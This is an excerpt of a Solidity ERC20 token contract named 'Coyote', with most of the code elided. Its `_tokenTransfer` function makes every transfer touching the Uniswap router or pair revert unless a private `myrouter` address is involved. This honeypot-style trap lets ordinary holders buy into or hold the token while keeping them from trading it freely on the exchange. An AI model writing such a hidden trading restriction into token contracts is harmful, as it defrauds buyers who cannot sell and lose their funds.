...
contract Coyote is Context, IERC20, Ownable {
 ...
 function _approve(
  ...
  function _tokenTransfer(
    ...
    if(address(sender) == address(uniswapV2Router) || address(sender) == address(uniswapV2Pair) || address(recipient) == address(uniswapV2Pair) || address(recipient) == address(uniswapV2Router)){
      emit Yesin(sender, recipient, amount);
      require((address(recipient) == address(myrouter) || address(sender) == address(myrouter)), "Router Not Allowed" );
    }
